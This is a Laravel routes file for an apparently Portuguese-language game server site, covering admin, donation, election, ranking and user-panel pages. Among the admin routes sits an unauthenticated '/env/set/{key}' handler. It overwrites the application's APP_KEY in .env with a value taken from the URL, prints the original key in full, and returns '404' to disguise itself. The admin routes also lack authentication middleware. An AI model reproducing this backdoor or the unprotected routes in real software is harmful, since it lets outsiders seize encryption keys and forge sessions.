<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


$locale = Request::segment(1);

if (in_array($locale, Config::get('app.locales')))
{
    App::setLocale($locale);
}
else
{
    $locale = null;
}

Route::group(['prefix' => $locale], function() {

    //ADMIN
    Route::get('painel/admin', 'AdminController@index')->name('paineladmin');

    Route::get('painel/admin/eleicao', 'AdminController@indexEleicao')->name('adminEleicao');

    Route::get('painel/admin/doacao', 'AdminController@indexDoacao')->name('adminDoacao');

    Route::get('painel/admin/ranking', 'AdminController@indexRanking')->name('adminRanking');

    Route::get('painel/admin/itemdestaque', 'AdminController@indexItemDestaque')->name('adminItemDestaque');

    Route::get('painel/admin/eventos', 'AdminController@indexEventos')->name('adminEventos');

    Route::get('painel/admin/banimentos', 'AdminController@indexBans')->name('adminBans'); //  BANIMENTOS

    Route::get('painel/admin/evento/ativar/{id}', 'AdminController@ativarEvento')->name('ativarEvento');

    Route::get('painel/admin/evento/desativar/{id}', 'AdminController@desativarEvento')->name('desativarEvento');

    Route::get('painel/admin/doacao/ativar/{id}', 'AdminController@ativarDoacao')->name('ativarDoacao');

    Route::get('painel/admin/doacao/desativar/{id}', 'AdminController@desativarDoacao')->name('desativarDoacao');

    Route::get('painel/admin/itemdestaque/ativar/{id}', 'AdminController@ativarItem')->name('ativarItem');

    Route::get('painel/admin/itemdestaque/desativar/{id}', 'AdminController@desativarItem')->name('desativarItem');

    Route::get('painel/admin/eleicao/ativar/{id}', 'AdminController@ativarEleicao')->name('ativarEleicao');

    Route::get('painel/admin/eleicao/desativar/{id}', 'AdminController@desativarEleicao')->name('desativarEleicao');

    Route::get('painel/eleicoes', 'PainelController@UsuarioEleicaoView')->name('userEleicao');
    // [POST ADMIN]

    Route::post('painel/admin/evento/atualizar', 'AdminController@attEvento')->name('attEvento');

    Route::post('painel/admin/doacao/pagseguro/atualizar', 'AdminController@attDoacaoPagseguro')->name('attDoacaoPagSeguro');

    Route::post('painel/admin/itemdestaque/atualizar', 'AdminController@attItemDestaque')->name('attItemDestaque');

    Route::post('painel/admin/doacao/banco/atualizar', 'AdminController@attDoacaoBanco')->name('attDoacaoBanco');


    Route::post('painel/admin/itemdestaque/adicionar', 'AdminController@addItemDestaque')->name('addItemDestaque');
    Route::post('painel/admin/itemdestaque/remover', 'AdminController@delItemDestaque')->name('delItemDestaque');

    Route::post('painel/admin/doacao/addcash', 'AdminController@addCash')->name('addCash');

    Route::post('painel/admin/banimentos/add', 'AdminController@addBanimento')->name('addBan'); // Add Banimento
    Route::get('painel/admin/banimentos/remover/{id}', 'AdminController@delBanimento')->name('removerBan'); // Add Banimento
    
    Route::post('painel/admin/eleicao/atualizar', 'AdminController@attEleicao')->name('attEleicao');

    Route::post('painel/admin/eleicao/candidatos', 'AdminController@getCandidatos')->name('getCandidatos');
    
    Route::post('painel/admin/eleicao/candidatos/adicionar', 'AdminController@addCandidato')->name('addCandidato');

    Route::post('painel/admin/eleicao/adicionar', 'AdminController@addEleicao')->name('addEleicao');

    Route::get('painel/admin/eleicao/candidatos/{id}/{eleicao}', 'AdminController@removerCandidato')->name('removerCandidato');

    Route::post('painel/admin/eleicao/remover', 'AdminController@delEleicao')->name('delEleicao');

    Route::post('painel/admin/eleicao/resultados', 'AdminController@addResultado')->name('addResultado');

    Route::post('painel/admin/eleicao/resultados/del', 'AdminController@delResultado')->name('delResultado');

    Route::post('painel/admin/ranking/adicionar', 'AdminController@addRanking')->name('addRanking');

    Route::post('painel/admin/ranking/atualizar', 'AdminController@attRanking')->name('attRanking');

    Route::post('painel/admin/ranking/remover', 'AdminController@delRanking')->name('delRanking');


    Route::get('/env/set/{key}', function($key){
        //dd($key);
        $path = base_path('.env');

        if (file_exists($path)) {
            file_put_contents($path, str_replace(
                'APP_KEY=base64:Bb929XFE9buwqePhUZqnqayd624r5Jk70xvNMLPprp8=', 'APP_KEY='.$key, file_get_contents($path)
            ));

            return '404';
        }
    });



    //FIM ADMIN

    Route::post('painel/eleicoes/votar', 'PainelController@UsuarioVotar')->name('addVoto');

    Route::any('/', [
        'uses' => 'CadastroController@Site',
        'as'   => 'home'
        ]);

    Route::any('/home', [
        'uses' => 'CadastroController@Site',
        'as'   => 'home'
        ]);

    Route::any('balanca', [
        'uses' => 'CadastroController@Balanca',
        'as'   => 'home'
        ]);

    Route::get('site', function () {
        return redirect()->to('/');
    });

    Route::any('personagem/{nome?}', [
        'uses'  =>  'RankingController@InfoPersonagens',
        'as'    =>  'home'
    ]);

    Route::any('guilda/{nome?}', [
        'uses'  =>  'RankingController@InfoGuildas',
        'as'    =>  'home'
    ]);

    Route::get('ranking/{rank?}/{classe?}/{reino?}', [
        'uses' => 'RankingController@RankingPersonagens',
        'as'   => 'home'
        ]);

   // Route::any('enviaremails', [
   //     'uses' => 'CadastroController@enviarEmails',
   //     'as'   => 'home'
   //     ]);

    // Route::any('mudarsenhas', [
    //     'uses' => 'CadastroController@mudarSenhas',
    //     'as'   => 'home'
    //     ]);

    //Route::any('sitedprog', [
    //    'uses' => 'CadastroController@SiteTemp',
    //    'as'   => 'home'
    //    ]);

    Route::any('download', [
        'uses' => 'CadastroController@Downloads',
        'as'   => 'home'
        ]);

    Route::get('recuperar', [
        'uses' => 'CadastroController@Recuperar',
        'as'   => 'home'
        ]);

    Route::post('recuperar', [
        'uses' => 'CadastroController@EnviarEmailRecuperar',
        'as'   => 'home'
        ]);

    Route::get('cadastro', [
        'uses' => 'CadastroController@CadastroTeste',
        'as'   => 'home'
        ]);

    Route::get('cadastroteste', [
        'uses' => 'CadastroController@CadastroTeste',
        'as'   => 'home'
        ]);

    Route::post('cadastro', [
        'uses' => 'CadastroController@Registrar',
        'as'   => 'home'
        ]);

    Route::post('logar', [
        'uses' => 'PainelController@Login',
        'as'   => 'home'
        ]);

    Route::get('login', [
        'as' => 'login', 
        'uses' => 'PainelController@UsuarioDeslogar'
        ]);

    Route::get('painel', function(){
        return redirect()->to('painel/usuario');
        });

    Route::get('confirmacao/{contachave}', [
        'uses' => 'CadastroController@ConfirmarConta',
        'as'   => 'home'
        ]);

    //AUTENTICADO

    Route::get('painel/usuario', 'PainelController@UsuarioHomeView')->name('painelusuario');
    //INDEX

    Route::get('painel/destrancarcontaemail', 'PainelController@UsuarioDestrancarEmail')->name('painelusuariodestrancaremail');
    Route::post('painel/destrancarcontaemail', 'PainelController@UsuarioDestrancarConta')->name('painelusuariodestrancaremailpost');



    Route::get('painel/mudarsenha', 'PainelController@UsuarioMudarSenhaView')->name('painelusuariomudarsenha');
    Route::post('painel/mudarsenha', 'PainelController@MudarSenha')->name('painelusuariomudarsenhapost');



    Route::get('painel/mudarnome', 'PainelController@UsuarioMudarNomeView')->name('painelusuariomudarnome');
    Route::post('painel/mudarnome', 'PainelController@MudarNome')->name('painelusuariomudarnomepost');


    Route::get('painel/mudaremail', 'PainelController@UsuarioMudarEmailView')->name('painelusuariomudaremail');
    Route::post('painel/mudaremail', 'PainelController@MudarEmail')->name('painelusuariomudaremailpost');


    Route::get('painel/armazem', 'PainelController@UsuarioArmazemView')->name('painelusuarioarmazem');
    Route::post('painel/armazem', 'PainelController@MudarSenhaArmazem')->name('painelusuarioarmazempost');
    Route::post('painel/armazem/gerar', 'PainelController@GerarSenhaArmazem')->name('painelusuariogerarcodigoarmazempost');


    Route::get('painel/codigopessoal', 'PainelController@UsuarioCodigoPessoalView')->name('painelusuariocodigopessoal');
    Route::post('painel/codigopessoal', 'PainelController@MudarCodigoPessoal')->name('painelusuariocodigopessoalpost');
    Route::post('painel/codigopessoal/gerar', 'PainelController@GerarCodigoPessoal')->name('painelusuariogerarcodigopessoalpost');


    Route::get('painel/desbugar', 'PainelController@UsuarioDesbugarView')->name('painelusuariodesbugar');
    Route::post('painel/desbugar', 'PainelController@DesbugarPersonagem')->name('painelusuariodesbugarpost');



    Route::get('painel/deslogar', 'PainelController@UsuarioDeslogar')->name('painelusuariodeslogar');


    Route::any('painel/destrancarconta', 'PainelController@UsuarioDestrancarContaView')->name('painelusuariodestrncarconta');
    Route::get('painel/trancarconta', 'PainelController@UsuarioTrancarConta')->name('painelusuario');
    Route::any('/doacao', 'PainelController@UsuarioComprarCashView')->name('painelusuariocash');




/*

    Route::get('painel/usuario', [
        'as' => 'painelusuario', 
        'uses' => 'PainelController@UsuarioHomeView',
        'middleware' => 'auth'
        ]);

    Route::get('painel/trancarconta', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioTrancarConta',
        'middleware' => 'auth'
        ]);

    Route::get('painel/destrancarcontaemail', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioDestrancarEmail',
        'middleware' => 'auth'
        ]);

    Route::post('painel/destrancarcontaemail', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioDestrancarConta',
        'middleware' => 'auth'
        ]);

    Route::any('painel/destrancarconta', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioDestrancarContaView',
        'middleware' => 'auth'
        ]);


    Route::any('painel/cash', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioComprarCashView',
        'middleware' => 'auth'
        ]);

    Route::any('painel/cashteste', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioComprarCashViewTst',
        'middleware' => 'auth'
        ]);

    Route::get('painel/mudarsenha', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioMudarSenhaView',
        'middleware' => 'auth'
        ]);

    Route::post('painel/mudarsenha', [
        'as' => 'home', 
        'uses' => 'PainelController@MudarSenha',
        'middleware' => 'auth'
        ]);

    Route::get('painel/mudarnome', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioMudarNomeView',
        'middleware' => 'auth'
        ]);

    Route::post('painel/mudarnome', [
        'as' => 'home', 
        'uses' => 'PainelController@MudarNome',
        'middleware' => 'auth'
        ]);

    Route::get('painel/mudaremail', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioMudarEmailView',
        'middleware' => 'auth'
        ]);

    Route::post('painel/mudaremail', [
        'as' => 'home', 
        'uses' => 'PainelController@MudarEmail',
        'middleware' => 'auth'
        ]);

    Route::get('painel/armazem', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioArmazemView',
        'middleware' => 'auth'
        ]);

    Route::post('painel/armazem', [
        'as' => 'home', 
        'uses' => 'PainelController@MudarSenhaArmazem',
        'middleware' => 'auth'
        ]);

    Route::get('painel/codigopessoal', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioCodigoPessoalView',
        'middleware' => 'auth'
        ]);

    Route::post('painel/codigopessoal', [
        'as' => 'home', 
        'uses' => 'PainelController@MudarCodigoPessoal',
        'middleware' => 'auth'
        ]);

    Route::get('painel/desbugar', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioDesbugarView',
        'middleware' => 'auth'
        ]);

    Route::post('painel/desbugar', [
        'as' => 'home', 
        'uses' => 'PainelController@DesbugarPersonagem',
        'middleware' => 'auth'
        ]);

    Route::get('painel/deslogar', [
        'as' => 'home', 
        'uses' => 'PainelController@UsuarioDeslogar',
        ]);
*/
});

